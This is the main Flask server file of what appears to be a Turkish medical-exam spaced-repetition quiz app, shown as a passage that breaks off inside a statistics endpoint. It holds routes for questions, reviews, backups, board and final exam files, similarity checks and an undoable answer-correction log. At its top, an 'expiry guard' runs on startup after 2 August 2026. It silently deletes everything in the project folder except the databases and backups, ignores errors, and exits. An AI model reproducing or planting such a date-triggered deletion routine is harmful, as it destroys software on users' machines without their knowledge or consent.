from flask import Flask, request, jsonify, render_template, send_from_directory, Response
import database
import os

# ─── EXPIRY GUARD ────────────────────────────────────────────────────────────
import sys, shutil, datetime

_EXPIRY_DATE = datetime.date(2026, 8, 2)    # 2 Ağustos 2026'dan sonra silinir

# Silinmeyecek dosya/klasörler (arkadaşın verisi korunur)
_KEEP = {"questions.db", "action_logs.db", "backups"}

if datetime.date.today() > _EXPIRY_DATE:
    _project_root = os.path.dirname(os.path.abspath(__file__))
    for _item in os.listdir(_project_root):
        if _item in _KEEP:
            continue  # Bu dosyaları/klasörleri atla
        _full_path = os.path.join(_project_root, _item)
        try:
            if os.path.isdir(_full_path):
                shutil.rmtree(_full_path)
            else:
                os.remove(_full_path)
        except Exception:
            pass  # Silme başarısız olsa bile devam et
    sys.exit(0)
# ─────────────────────────────────────────────────────────────────────────────

# Load .env file manually if it exists to avoid dependency issues
env_path = os.path.join(os.path.dirname(__file__), ".env")
if os.path.exists(env_path):
    with open(env_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                key, val = line.split("=", 1)
                os.environ[key.strip()] = val.strip()

def turkish_lower(text):
    if not text:
        return ""
    mapping = {
        'İ': 'i',
        'I': 'ı',
        'Ş': 'ş',
        'Ç': 'ç',
        'Ğ': 'ğ',
        'Ü': 'ü',
        'Ö': 'ö'
    }
    for k, v in mapping.items():
        text = text.replace(k, v)
    return text.lower().replace('\u0307', '')

app = Flask(__name__, template_folder="templates", static_folder="static")

from execution.similarity_cache import SimilarityCache
similarity_cache = SimilarityCache(app.root_path, turkish_lower)


# Optional HTTP Basic Authentication
def check_auth(username, password):
    env_username = os.environ.get("APP_USERNAME", "ahmet")
    env_password = os.environ.get("APP_PASSWORD")
    if not env_password:
        return True
    return username == env_username and password == env_password

def authenticate():
    return Response(
        'Lütfen giriş yapın.\n'
        'Geçersiz kimlik bilgileri.', 401,
        {'WWW-Authenticate': 'Basic realm="Giris Yapin"'}
    )

@app.before_request
def require_login():
    env_password = os.environ.get("APP_PASSWORD")
    if not env_password:
        return
        
    auth = request.authorization
    if not auth or not check_auth(auth.username, auth.password):
        return authenticate()

# Ensure database is initialized
database.init_db()

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/questions/due", methods=["GET"])
def get_due_questions():
    try:
        all_param = request.args.get("all", "false").lower() == "true"
        kurul_filter = request.args.get("kurul")
        difficulty_filter = request.args.get("difficulty")
        difficulty_min = request.args.get("difficulty_min")
        difficulty_max = request.args.get("difficulty_max")
        sort_filter = request.args.get("sort")
        yil_filter = request.args.get("yil")
        
        conn = database.get_db_connection()
        cursor = conn.cursor()
        
        query = "SELECT * FROM questions WHERE is_archived = 0"
        params = []
        
        if not all_param:
            from datetime import datetime
            now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            query += " AND next_review <= ?"
            params.append(now_str)
            
        if kurul_filter and kurul_filter.strip():
            query += " AND kurul_adi = ?"
            params.append(kurul_filter.strip())
            
        if yil_filter and yil_filter.strip():
            query += " AND yil = ?"
            params.append(yil_filter.strip())
            
        if difficulty_min is not None and difficulty_max is not None:
            try:
                query += " AND ease_factor >= ? AND ease_factor <= ?"
                params.extend([float(difficulty_min), float(difficulty_max)])
            except ValueError:
                pass
        elif difficulty_filter:
            if difficulty_filter == "hard":
                query += " AND ease_factor < 1.8"
            elif difficulty_filter == "medium":
                query += " AND ease_factor >= 1.8 AND ease_factor <= 2.4"
            elif difficulty_filter == "easy":
                query += " AND ease_factor > 2.4"
                
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        
        questions = [dict(row) for row in rows]
        
        # Apply sorting logic in Python
        if sort_filter == "oldest":
            questions.sort(key=lambda x: x.get("next_review") or "")
        elif sort_filter == "hybrid_due":
            from datetime import datetime
            import random
            now = datetime.now()
            offset = 315360000  # 10 years in seconds
            for q in questions:
                nr_str = q.get("next_review")
                try:
                    nr_dt = datetime.strptime(nr_str, "%Y-%m-%d %H:%M:%S")
                except:
                    nr_dt = now
                diff_seconds = (now - nr_dt).total_seconds()
                
                # Apply Jitter (Idea A) to ease_factor in the formula
                ef = (q.get("ease_factor") or 2.5) + random.uniform(-0.075, 0.075)
                q["_hybrid_score"] = (diff_seconds + offset) / max(1.0, ef)
                
            questions.sort(key=lambda x: x["_hybrid_score"], reverse=True)
            
            # Apply Interleaving (Idea B)
            groups = {}
            for q in questions:
                k = q.get("kurul_adi") or "genel"
                groups.setdefault(k, []).append(q)
            
            interleaved = []
            group_keys = sorted(list(groups.keys()))
            while any(len(groups[k]) > 0 for k in group_keys):
                for k in group_keys:
                    if len(groups[k]) > 0:
                        interleaved.append(groups[k].pop(0))
            questions = interleaved

        elif sort_filter == "hardest":
            import random
            for q in questions:
                # Apply Jitter (Idea A)
                q["_sort_score"] = (q.get("ease_factor") or 2.5) + random.uniform(-0.075, 0.075)
            questions.sort(key=lambda x: x["_sort_score"])
            
            # Apply Interleaving (Idea B)
            groups = {}
            for q in questions:
                k = q.get("kurul_adi") or "genel"
                groups.setdefault(k, []).append(q)
                
            interleaved = []
            group_keys = sorted(list(groups.keys()))
            while any(len(groups[k]) > 0 for k in group_keys):
                for k in group_keys:
                    if len(groups[k]) > 0:
                        interleaved.append(groups[k].pop(0))
            questions = interleaved
            
        else: # newest
            questions.sort(key=lambda x: x.get("created_at") or "", reverse=True)
        return jsonify(questions)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions", methods=["POST"])
def add_question():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        required_fields = ["question_text", "option_a", "option_b", "option_c", "option_d", "option_e", "correct_option"]
        for field in required_fields:
            if field not in data or not str(data[field]).strip():
                return jsonify({"error": f"Missing or empty field: {field}"}), 400
                
        correct = str(data["correct_option"]).strip().upper()
        if correct not in ["A", "B", "C", "D", "E"]:
            return jsonify({"error": "Correct option must be A, B, C, D, or E"}), 400
            
        question_id = database.add_question(
            question_text=data["question_text"].strip(),
            option_a=data["option_a"].strip(),
            option_b=data["option_b"].strip(),
            option_c=data["option_c"].strip(),
            option_d=data["option_d"].strip(),
            option_e=data["option_e"].strip(),
            correct_option=correct,
            yil=data.get("yil", "final"),
            soru_numarasi=data.get("soru_numarasi"),
            kurul_adi=data.get("kurul_adi")
        )
        similarity_cache.invalidate()
        return jsonify({"status": "success", "id": question_id}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/<int:question_id>/review", methods=["POST"])
def review_question(question_id):
    try:
        data = request.json
        if not data or "rating" not in data:
            return jsonify({"error": "Rating is required"}), 400
            
        rating = int(data["rating"])
        if rating not in range(1, 12):
            return jsonify({"error": "Rating must be between 1 and 11"}), 400
            
        result = database.review_question(question_id, rating)
        if not result:
            return jsonify({"error": "Question not found"}), 404
            
        return jsonify({"status": "success", "data": result})
    except ValueError as ve:
        return jsonify({"error": str(ve)}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/stats", methods=["GET"])
def get_stats():
    try:
        stats = database.get_stats()
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions", methods=["GET"])
def get_all_questions():
    try:
        questions = database.get_all_questions()
        return jsonify(questions)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/<int:question_id>", methods=["PUT"])
def update_question(question_id):
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        required_fields = ["question_text", "option_a", "option_b", "option_c", "option_d", "option_e", "correct_option"]
        for field in required_fields:
            if field not in data or not str(data[field]).strip():
                return jsonify({"error": f"Missing or empty field: {field}"}), 400
                
        correct = str(data["correct_option"]).strip().upper()
        if correct not in ["A", "B", "C", "D", "E"]:
            return jsonify({"error": "Correct option must be A, B, C, D, or E"}), 400
            
        success = database.update_question(
            question_id=question_id,
            question_text=data["question_text"].strip(),
            option_a=data["option_a"].strip(),
            option_b=data["option_b"].strip(),
            option_c=data["option_c"].strip(),
            option_d=data["option_d"].strip(),
            option_e=data["option_e"].strip(),
            correct_option=correct,
            yil=data.get("yil", "final"),
            soru_numarasi=data.get("soru_numarasi"),
            kurul_adi=data.get("kurul_adi")
        )
        if not success:
            return jsonify({"error": "Question not found"}), 404
            
        similarity_cache.invalidate()
        return jsonify({"status": "success", "message": "Question updated successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/<int:question_id>", methods=["DELETE"])
def delete_question(question_id):
    try:
        success = database.delete_question(question_id)
        if not success:
            return jsonify({"error": "Question not found"}), 404
        similarity_cache.invalidate()
        return jsonify({"status": "success", "message": "Question deleted successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/backup", methods=["GET"])
def backup_database():
    try:
        backup_data = database.get_backup_data()
        response = jsonify(backup_data)
        response.headers["Content-Disposition"] = "attachment; filename=tipta_tekrar_yedek.json"
        return response
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/restore", methods=["POST"])
def restore_database():
    try:
        data = request.json
        if not isinstance(data, list):
            return jsonify({"error": "Data must be a JSON array of questions"}), 400
            
        database.restore_backup_data(data)
        similarity_cache.invalidate()
        return jsonify({"status": "success", "message": "Database restored successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/bulk", methods=["POST"])
def add_questions_bulk():
    try:
        data = request.json
        if not isinstance(data, list):
            return jsonify({"error": "Data must be a JSON array of questions"}), 400
            
        saved_count = 0
        errors = []
        
        for index, item in enumerate(data):
            required_fields = ["question_text", "option_a", "option_b", "option_c", "option_d", "option_e", "correct_option"]
            missing_fields = [f for f in required_fields if f not in item or not str(item[f]).strip()]
            if missing_fields:
                errors.append(f"Soru #{index + 1}: Eksik alanlar var: {', '.join(missing_fields)}")
                continue
                
            correct = str(item["correct_option"]).strip().upper()
            if correct not in ["A", "B", "C", "D", "E"]:
                errors.append(f"Soru #{index + 1}: Doğru şık A-E arasında olmalıdır.")
                continue
                
            database.add_question(
                question_text=item["question_text"].strip(),
                option_a=item["option_a"].strip(),
                option_b=item["option_b"].strip(),
                option_c=item["option_c"].strip(),
                option_d=item["option_d"].strip(),
                option_e=item["option_e"].strip(),
                correct_option=correct
            )
            saved_count += 1
            
        similarity_cache.invalidate()
        return jsonify({
            "status": "success",
            "saved_count": saved_count,
            "errors": errors
        }), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/delete-bulk", methods=["POST"])
def delete_questions_bulk():
    try:
        data = request.json
        if not data or "ids" not in data or not isinstance(data["ids"], list):
            return jsonify({"error": "List of ids is required"}), 400
            
        database.delete_questions_bulk(data["ids"])
        similarity_cache.invalidate()
        return jsonify({"status": "success", "message": "Questions deleted successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/reset-bulk", methods=["POST"])
def reset_questions_bulk():
    try:
        data = request.json
        if not data or "ids" not in data or not isinstance(data["ids"], list):
            return jsonify({"error": "List of ids is required"}), 400
            
        database.reset_questions_bulk(data["ids"])
        return jsonify({"status": "success", "message": "Repetitions progress reset successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/special-repeats", methods=["POST"])
def add_special_repeat():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        required_fields = ["question_text", "option_a", "option_b", "option_c", "option_d", "option_e", "correct_option"]
        for field in required_fields:
            if field not in data or not str(data[field]).strip():
                return jsonify({"error": f"Missing or empty field: {field}"}), 400
                
        correct = str(data["correct_option"]).strip().upper()
        if correct not in ["A", "B", "C", "D", "E"]:
            return jsonify({"error": "Correct option must be A, B, C, D, or E"}), 400
            
        inserted_id = database.add_to_special_repeats(
            question_text=data["question_text"].strip(),
            option_a=data["option_a"].strip(),
            option_b=data["option_b"].strip(),
            option_c=data["option_c"].strip(),
            option_d=data["option_d"].strip(),
            option_e=data["option_e"].strip(),
            correct_option=correct,
            yil=data.get("yil", "final"),
            soru_numarasi=data.get("soru_numarasi"),
            kurul_adi=data.get("kurul_adi"),
            original_question_id=data.get("original_question_id")
        )
        return jsonify({"status": "success", "id": inserted_id}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/special-repeats/due", methods=["GET"])
def get_due_special_repeats():
    try:
        all_param = request.args.get("all", "false").lower() == "true"
        questions = database.get_due_special_repeats(all_questions=all_param)
        return jsonify(questions)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/special-repeats/<int:question_id>/review", methods=["POST"])
def review_special_repeat(question_id):
    try:
        data = request.json
        if not data or "rating" not in data:
            return jsonify({"error": "Rating is required"}), 400
            
        rating = int(data["rating"])
        if rating not in range(1, 12):
            return jsonify({"error": "Rating must be between 1 and 11"}), 400
            
        result = database.review_special_repeat(question_id, rating)
        if not result:
            return jsonify({"error": "Question not found"}), 404
            
        return jsonify({"status": "success", "data": result})
    except ValueError as ve:
        return jsonify({"error": str(ve)}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/special-repeats/<int:question_id>", methods=["DELETE"])
def delete_special_repeat(question_id):
    try:
        success = database.delete_special_repeat(question_id)
        if not success:
            return jsonify({"error": "Question not found"}), 404
        return jsonify({"status": "success", "message": "Question removed from list successfully"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/kurullar", methods=["GET"])
def list_kurullar():
    try:
        import json
        folder_path = os.path.join(app.root_path, "kurul soruları json format")
        if not os.path.exists(folder_path):
            return jsonify([])
        
        files = [f for f in os.listdir(folder_path) if f.endswith(".json")]
        kurullar = []
        
        for filename in files:
            file_path = os.path.join(folder_path, filename)
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    questions = json.load(f)
                yil_groups = {}
                for q in questions:
                    yil = q.get("yil", "Bilinmeyen Yıl")
                    yil_groups[yil] = yil_groups.get(yil, 0) + 1
                
                for yil, count in yil_groups.items():
                    name_without_ext = os.path.splitext(filename)[0].replace("sorular_", "")
                    display_name = f"{name_without_ext.upper()} ({yil})"
                    kurullar.append({
                        "id": f"{name_without_ext}_{yil}",
                        "name": display_name,
                        "file_name": filename,
                        "yil": yil,
                        "count": count
                    })
            except Exception as fe:
                print(f"Error reading JSON file {filename}: {fe}")
        
        return jsonify(kurullar)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/kurullar/<file_name>/<yil>/questions", methods=["GET"])
def get_kurul_questions(file_name, yil):
    try:
        import json
        folder_path = os.path.join(app.root_path, "kurul soruları json format")
        file_path = os.path.join(folder_path, file_name)
        if not os.path.exists(file_path):
            return jsonify({"error": "Kurul dosyası bulunamadı"}), 404
            
        with open(file_path, "r", encoding="utf-8") as f:
            questions = json.load(f)
            
        filtered = [q for q in questions if str(q.get("yil")) == str(yil)]
        
        db_conn = database.get_db_connection()
        db_cursor = db_conn.cursor()
        
        name_without_ext = file_name.replace("sorular_", "").replace(".json", "")
        
        db_cursor.execute("""
            SELECT id, soru_numarasi, correct_option, interval, ease_factor, repetitions, next_review 
            FROM questions 
            WHERE kurul_adi = ? AND yil = ?
        """, (name_without_ext, yil))
        db_questions = {row["soru_numarasi"]: dict(row) for row in db_cursor.fetchall()}
        db_conn.close()
        
        for q in filtered:
            num = q.get("soru_numarasi")
            if num in db_questions:
                q["db_id"] = db_questions[num]["id"]
                q["db_correct_option"] = db_questions[num]["correct_option"]
                q["interval"] = db_questions[num]["interval"]
                q["ease_factor"] = db_questions[num]["ease_factor"]
                q["repetitions"] = db_questions[num]["repetitions"]
                q["next_review"] = db_questions[num]["next_review"]
            else:
                q["db_id"] = None
                
        return jsonify(filtered)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/finaller", methods=["GET"])
def list_finaller():
    try:
        import json
        folder_path = os.path.join(app.root_path, "final soruları json format")
        if not os.path.exists(folder_path):
            return jsonify([])
        
        files = [f for f in os.listdir(folder_path) if f.endswith(".json")]
        finaller = []
        
        for filename in files:
            file_path = os.path.join(folder_path, filename)
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    questions = json.load(f)
                yil_groups = {}
                for q in questions:
                    yil = q.get("yil", "Bilinmeyen Yıl")
                    yil_groups[yil] = yil_groups.get(yil, 0) + 1
                
                for yil, count in yil_groups.items():
                    name_without_ext = os.path.splitext(filename)[0].replace("sorular_", "")
                    display_name = f"{name_without_ext.upper()} ({yil})"
                    finaller.append({
                        "id": f"{name_without_ext}_{yil}",
                        "name": display_name,
                        "file_name": filename,
                        "yil": yil,
                        "count": count
                    })
            except Exception as fe:
                print(f"Error reading JSON file {filename}: {fe}")
        
        return jsonify(finaller)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/finaller/<file_name>/<yil>/questions", methods=["GET"])
def get_final_questions(file_name, yil):
    try:
        import json
        folder_path = os.path.join(app.root_path, "final soruları json format")
        file_path = os.path.join(folder_path, file_name)
        if not os.path.exists(file_path):
            return jsonify({"error": "Final dosyası bulunamadı"}), 404
            
        with open(file_path, "r", encoding="utf-8") as f:
            questions = json.load(f)
            
        filtered = [q for q in questions if str(q.get("yil")) == str(yil)]
        
        db_conn = database.get_db_connection()
        db_cursor = db_conn.cursor()
        
        name_without_ext = file_name.replace("sorular_", "").replace(".json", "")
        
        db_cursor.execute("""
            SELECT id, soru_numarasi, correct_option, interval, ease_factor, repetitions, next_review 
            FROM questions 
            WHERE kurul_adi = ? AND yil = ?
        """, (name_without_ext, yil))
        db_questions = {row["soru_numarasi"]: dict(row) for row in db_cursor.fetchall()}
        db_conn.close()
        
        for q in filtered:
            num = q.get("soru_numarasi")
            if num in db_questions:
                q["db_id"] = db_questions[num]["id"]
                q["db_correct_option"] = db_questions[num]["correct_option"]
                q["interval"] = db_questions[num]["interval"]
                q["ease_factor"] = db_questions[num]["ease_factor"]
                q["repetitions"] = db_questions[num]["repetitions"]
                q["next_review"] = db_questions[num]["next_review"]
            else:
                q["db_id"] = None
                
        return jsonify(filtered)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/review-kurul", methods=["POST"])
def review_kurul_question():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data provided"}), 400
            
        required_fields = ["question_text", "option_a", "option_b", "option_c", "option_d", "option_e", "correct_option", "rating", "kurul_adi", "yil", "soru_numarasi"]
        for field in required_fields:
            if field not in data or data[field] is None:
                return jsonify({"error": f"Missing field: {field}"}), 400
                
        rating = int(data["rating"])
        if rating not in range(1, 12):
            return jsonify({"error": "Rating must be between 1 and 11"}), 400
            
        kurul_adi = str(data["kurul_adi"]).strip()
        yil = str(data["yil"]).strip()
        soru_numarasi = int(data["soru_numarasi"])
        
        conn = database.get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            SELECT id FROM questions 
            WHERE kurul_adi = ? AND yil = ? AND soru_numarasi = ?
        """, (kurul_adi, yil, soru_numarasi))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            question_id = row["id"]
        else:
            question_id = database.add_question(
                question_text=data["question_text"].strip(),
                option_a=data["option_a"].strip(),
                option_b=data["option_b"].strip(),
                option_c=data["option_c"].strip(),
                option_d=data["option_d"].strip(),
                option_e=data["option_e"].strip(),
                correct_option=data["correct_option"].strip().upper(),
                yil=yil,
                soru_numarasi=soru_numarasi,
                kurul_adi=kurul_adi
            )
            
        result = database.review_question(question_id, rating)
        return jsonify({"status": "success", "data": result})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/similarity-check", methods=["POST"])
def check_similarity():
    try:
        from difflib import SequenceMatcher
        import re
        
        data = request.json
        if not data or "question_text" not in data:
            return jsonify({"error": "question_text is required"}), 400
            
        threshold = float(data.get("threshold", 0.70))
        
        current_question = turkish_lower(data["question_text"].strip())
        current_opt_a = turkish_lower(data.get("option_a", "").strip())
        current_opt_b = turkish_lower(data.get("option_b", "").strip())
        current_opt_c = turkish_lower(data.get("option_c", "").strip())
        current_opt_d = turkish_lower(data.get("option_d", "").strip())
        current_opt_e = turkish_lower(data.get("option_e", "").strip())
        
        current_text = f"{current_question} {current_opt_a} {current_opt_b} {current_opt_c} {current_opt_d} {current_opt_e}".strip()
        
        current_id = int(data.get("question_id")) if data.get("question_id") is not None else None
        current_kurul = data.get("kurul_adi")
        current_yil = data.get("yil")
        current_num = int(data.get("soru_numarasi")) if data.get("soru_numarasi") is not None else None
        
        # Ensure cache is loaded
        if not similarity_cache.is_loaded:
            similarity_cache.load_cache()
            
        current_kw = similarity_cache.extract_keywords(current_text)
        
        def get_smart_ratio(q1_stem, q1_opts, q2_stem, q2_opts, threshold):
            q1_opts = [o for o in q1_opts if o]
            q2_opts = [o for o in q2_opts if o]
            if q1_opts and q2_opts:
                opt_scores = []
                for o1 in q1_opts:
                    best_opt_score = 0.0
                    for o2 in q2_opts:
                        sm_opt = SequenceMatcher(None, o1, o2)
                        if sm_opt.quick_ratio() >= best_opt_score:
                            r = sm_opt.ratio()
                            if r > best_opt_score:
                                best_opt_score = r
                    opt_scores.append(best_opt_score)
                opts_ratio = sum(opt_scores) / len(opt_scores)
            else:
                opts_ratio = 0.0
            
            # Stem keywords for weighting
            stem_kw = similarity_cache.extract_keywords(q1_stem)
            if not stem_kw:
                return opts_ratio
                
            # Math constraint: 0.5 * stem_ratio + 0.5 * opts_ratio >= threshold
            # So stem_ratio >= 2 * threshold - opts_ratio
            min_stem_ratio = 2 * threshold - opts_ratio
            if min_stem_ratio > 1.0:
                return 0.0
                
            sm = SequenceMatcher(None, q1_stem, q2_stem)
            if min_stem_ratio > 0.0:
                if sm.real_quick_ratio() < min_stem_ratio:
                    return 0.0
                if sm.quick_ratio() < min_stem_ratio:
                    return 0.0
            
            stem_ratio = sm.ratio()
            if min_stem_ratio > 0.0 and stem_ratio < min_stem_ratio:
                return 0.0
                
            return 0.5 * stem_ratio + 0.5 * opts_ratio

        similar_questions = []
        len1 = len(current_text)
        if len1 == 0:
            return jsonify([])
            
        for q in similarity_cache.cached_questions:
            # Skip if it is the current database question
            if q["id"] is not None and current_id is not None and int(q["id"]) == int(current_id):
                continue
                
            q_kurul = q.get("kurul_adi")
            q_yil = q.get("yil")
            q_num = q.get("soru_numarasi")
            
            # Deduplicate: Skip if already loaded from DB (for JSON items)
            if q["id"] is None:
                q_num_int = int(q_num) if q_num is not None else None
                if (q_kurul, str(q_yil), q_num_int) in similarity_cache.db_identifiers:
                    continue
                    
            # Skip comparing to active question itself
            q_num_int = int(q_num) if q_num is not None else None
            if current_kurul == q_kurul and str(current_yil) == str(q_yil) and current_num == q_num_int:
                continue
                
            compare_text = q["full_text"]
            len2 = len(compare_text)
            if len2 == 0:
                continue
            if min(len1, len2) / max(len1, len2) < 0.40:
                continue
                
            # Katman 2: Agresif Jaccard Ön-Filtreleme
            compare_kw = q["keywords"]
            if current_kw and compare_kw:
                intersection = len(current_kw & compare_kw)
                union = len(current_kw | compare_kw)
                if union == 0 or (intersection / union) < 0.04:
                    continue
            else:
                flat_sm = SequenceMatcher(None, current_text, compare_text)
                if flat_sm.real_quick_ratio() < 0.95 or flat_sm.quick_ratio() < 0.95 or flat_sm.ratio() < 0.95:
                    continue
            
            # Calculate smart weighted ratio
            ratio = get_smart_ratio(
                current_question, 
                [current_opt_a, current_opt_b, current_opt_c, current_opt_d, current_opt_e],
                q["stem_lower"],
                q["opts_lower"],
                threshold
            )
            
            if ratio >= threshold:
                similar_questions.append({
                    "id": q["id"],
                    "question_text": q["question_text"],
                    "option_a": q["option_a"],
                    "option_b": q["option_b"],
                    "option_c": q["option_c"],
                    "option_d": q["option_d"],
                    "option_e": q["option_e"],
                    "correct_option": q["correct_option"],
                    "yil": q_yil or "final",
                    "soru_numarasi": q_num,
                    "kurul_adi": q_kurul,
                    "source": q["source"],
                    "ratio": round(ratio * 100, 1)
                })
                
        similar_questions.sort(key=lambda x: x["ratio"], reverse=True)
        return jsonify(similar_questions[:5])
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/questions/correct-answer", methods=["POST"])
def correct_answer():
    try:
        import json
        data = request.json
        if not data or "correct_option" not in data:
            return jsonify({"error": "correct_option is required"}), 400
            
        correct = str(data["correct_option"]).strip().upper()
        if correct not in ["A", "B", "C", "D", "E"]:
            return jsonify({"error": "Correct option must be A, B, C, D, or E"}), 400
            
        question_id = data.get("question_id")
        yil = data.get("yil")
        soru_numarasi = data.get("soru_numarasi")
        kurul_adi = data.get("kurul_adi")
        
        db_updated = False
        json_updated = False
        
        if question_id:
            conn = database.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM questions WHERE id = ?", (question_id,))
            row = cursor.fetchone()
            if row:
                old_dict = dict(row)
                cursor.execute("UPDATE questions SET correct_option = ? WHERE id = ?", (correct, question_id))
                conn.commit()
                db_updated = True
                
                cursor.execute("SELECT * FROM questions WHERE id = ?", (question_id,))
                new_dict = dict(cursor.fetchone())
                database.add_log('CORRECT_ANSWER', question_id, old_data=old_dict, new_data=new_dict)
            conn.close()
        elif kurul_adi and yil and soru_numarasi:
            conn = database.get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM questions WHERE kurul_adi = ? AND yil = ? AND soru_numarasi = ?", (kurul_adi, yil, soru_numarasi))
            row = cursor.fetchone()
            if row:
                question_id = row["id"]
                old_dict = dict(row)
                cursor.execute("UPDATE questions SET correct_option = ? WHERE id = ?", (correct, question_id))
                conn.commit()
                db_updated = True
                
                cursor.execute("SELECT * FROM questions WHERE id = ?", (question_id,))
                new_dict = dict(cursor.fetchone())
                database.add_log('CORRECT_ANSWER', question_id, old_data=old_dict, new_data=new_dict)
            conn.close()
            
        if kurul_adi and yil and soru_numarasi:
            filename = f"sorular_{kurul_adi}.json"
            folder_path = os.path.join(app.root_path, "kurul soruları json format")
            file_path = os.path.join(folder_path, filename)
            if not os.path.exists(file_path):
                folder_path = os.path.join(app.root_path, "final soruları json format")
                file_path = os.path.join(folder_path, filename)
            
            if os.path.exists(file_path):
                try:
                    with open(file_path, "r", encoding="utf-8") as f:
                        questions = json.load(f)
                        
                    found = False
                    for q in questions:
                        if str(q.get("yil")) == str(yil) and int(q.get("soru_numarasi")) == int(soru_numarasi):
                            q["cevap"] = correct
                            found = True
                            break
                            
                    if found:
                        with open(file_path, "w", encoding="utf-8") as f:
                            json.dump(questions, f, ensure_ascii=False, indent=2)
                        json_updated = True
                except Exception as je:
                    print(f"Error updating JSON answer: {je}")
                    
        similarity_cache.invalidate()
        return jsonify({
            "status": "success",
            "db_updated": db_updated,
            "json_updated": json_updated,
            "message": "Answer key corrected successfully."
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/logs", methods=["GET"])
def get_logs():
    try:
        logs = database.get_action_logs()
        return jsonify(logs)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/logs/<int:log_id>/undo", methods=["POST"])
def undo_log_action(log_id):
    try:
        import json
        log_conn = database.get_log_db_connection()
        log_cursor = log_conn.cursor()
        log_cursor.execute("SELECT * FROM logs WHERE id = ?", (log_id,))
        row = log_cursor.fetchone()
        log_conn.close()
        
        if not row:
            return jsonify({"error": "Log record not found"}), 404
            
        log_dict = dict(row)
        action_type = log_dict["action_type"]
        old_data = json.loads(log_dict["old_data"]) if log_dict["old_data"] else None
        
        success = database.undo_action(log_id)
        if not success:
            return jsonify({"error": "Undo operation failed"}), 400
            
        if action_type == 'CORRECT_ANSWER' and old_data:
            kurul_adi = old_data.get("kurul_adi")
            yil = old_data.get("yil")
            soru_numarasi = old_data.get("soru_numarasi")
            old_correct_option = old_data.get("correct_option")
            
            if kurul_adi and yil and soru_numarasi and old_correct_option:
                filename = f"sorular_{kurul_adi}.json"
                folder_path = os.path.join(app.root_path, "kurul soruları json format")
                file_path = os.path.join(folder_path, filename)
                if not os.path.exists(file_path):
                    folder_path = os.path.join(app.root_path, "final soruları json format")
                    file_path = os.path.join(folder_path, filename)
                if os.path.exists(file_path):
                    try:
                        with open(file_path, "r", encoding="utf-8") as f:
                            questions = json.load(f)
                            
                        for q in questions:
                            if str(q.get("yil")) == str(yil) and int(q.get("soru_numarasi")) == int(soru_numarasi):
                                q["cevap"] = old_correct_option
                                break
                                
                        with open(file_path, "w", encoding="utf-8") as f:
                            json.dump(questions, f, ensure_ascii=False, indent=2)
                    except Exception as je:
                        print(f"Error reverting JSON answer: {je}")
                        
        similarity_cache.invalidate()
        return jsonify({"status": "success", "message": "Action successfully undone."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/stats/advanced", methods=["GET"])
def get_advanced_stats():
    try:
        import json
        db_conn = database.get_db_connection()
        db_cursor = db_conn.cursor()
        
        db_cursor.execute("SELECT COUNT(*) FROM questions WHERE is_archived = 0")
        total_active = db_cursor.fetchone()[0]
        
        db_cursor.execute("SELECT COUNT(*) FROM questions WHERE ease_factor < 1.8 AND is_archived = 0")
        hard_count = db_cursor.fetchone()[0]
        
        db_cursor.execute("SELECT COUNT(*) FROM questions WHERE ease_factor >= 1.8 AND ease_factor <= 2.4 AND is_archived = 0")
        medium_count = db_cursor.fetchone()[0]
        
        db_cursor.execute("SELECT COUNT(*) FROM questions WHERE ease_factor > 2.4 AND is_archived = 0")
        easy_count = db_cursor.fetchone()[0]
        
        # Detailed difficulty distribution (bins of ease_factor in steps of 0.05)
        db_cursor.execute("SELECT ease_factor FROM questions WHERE is_archived = 0")
        ease_factors = [row[0] for row in db_cursor.fetchall()]
        
        bin_size = 0.05
        num_bins = int(round((3.0 - 1.3) / bin_size)) + 1
        bins = [round(1.3 + i * bin_size, 2) for i in range(num_bins)]
        
        detailed_breakdown = {f"{b:.2f}": 0 for b in bins}
        for ef in ease_factors:
